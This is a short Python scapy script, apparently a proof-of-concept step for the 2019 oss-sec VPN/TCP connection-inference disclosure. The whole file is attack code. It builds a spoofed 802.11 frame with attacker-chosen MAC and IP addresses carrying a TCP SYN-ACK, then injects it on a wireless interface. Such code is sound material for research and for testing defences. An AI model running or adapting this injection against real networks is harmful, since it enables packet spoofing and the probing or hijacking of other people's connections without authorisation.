#!/usr/bin/python2
"""
Shortens step 1 from https://seclists.org/oss-sec/2019/q4/122 (theory.txt)

Moves you to step 2 it would seem; based on observed outcomes from step 1.
"""
import binascii
import sys
from lib import shared
from scapy.all import *

if __name__ == '__main__':
    sh = shared.Shared(sys.argv)

    ## Grab a handle
    pFilter = sh.ourFilter()

    ## Create a Syn Ack
    ourPkt = RadioTap(binascii.unhexlify(sh.vipFindPkt.replace(' ', '')))


    ## This is where you'd thread or loop or whatever approach you want
    del ourPkt[IP]
    try:
        ourPkt[Dot11].addr1 = sys.argv[1]
        ourPkt[Dot11].addr2 = sys.argv[2]
        ourPkt[Dot11].addr3 = sys.argv[2]
        ourPkt = ourPkt/IP(dst = sys.argv[3], src = sys.argv[5])/TCP(flags = 'SA')  ## << Random IP my test NIC was assigned
    except Exception as E:
        print(E)
        sys.exit(1)

    ## Fire
    try:
        print(ourPkt.summary())
        print(ourPkt[IP].src + ' ---> ' + ourPkt[IP].dst)
        sendp(ourPkt, iface = sys.argv[4], verbose = True)
    except Exception as E:
        print(E)
        sys.exit(1)
